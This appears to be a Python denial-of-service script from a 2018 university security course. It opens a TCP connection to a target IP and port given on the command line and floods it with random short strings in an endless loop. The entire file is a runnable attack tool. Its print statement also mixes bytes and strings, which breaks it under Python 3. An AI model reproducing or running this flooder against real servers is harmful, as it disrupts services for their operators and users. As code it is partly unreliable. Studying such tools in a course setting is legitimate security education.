#! /usr/bin/env python

# Security in Computer Systems 2018 - SDU.
# Socket Flood Attack.
# @CarlosViescasHuerta.

import socket
import sys
import time
import string
import random

dst_ip = sys.argv[1]
dst_port = int(sys.argv[2])
# Counter
i = 0

def msg_gen():
    size = random.randint(1,8)
    chars=string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(size))

# Starting attack
print ("***** Starting Socket Flood DoS attack ******")


# Create Socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = (dst_ip, dst_port)
sock.connect(server_address)
        
try:
    while True:
        
        #for port in range(5001, 20000):

        # Create msg
        att_msg_raw = msg_gen()
        msg = att_msg_raw.encode()

        # Send message
        #src_addr = (dst_ip, port)
        #sock.bind(src_addr)
        sock.send(msg)

        i = i + 1
        print("Flooding server on " + dst_ip + " with #" + str(i) + " msg: " + msg + ".")

except KeyboardInterrupt:
        
    print ("\n \n \n \n \n \n \n \n \n \n \n")
    print ("Socket Flood interrupted. Total msgs sent: " + str(i))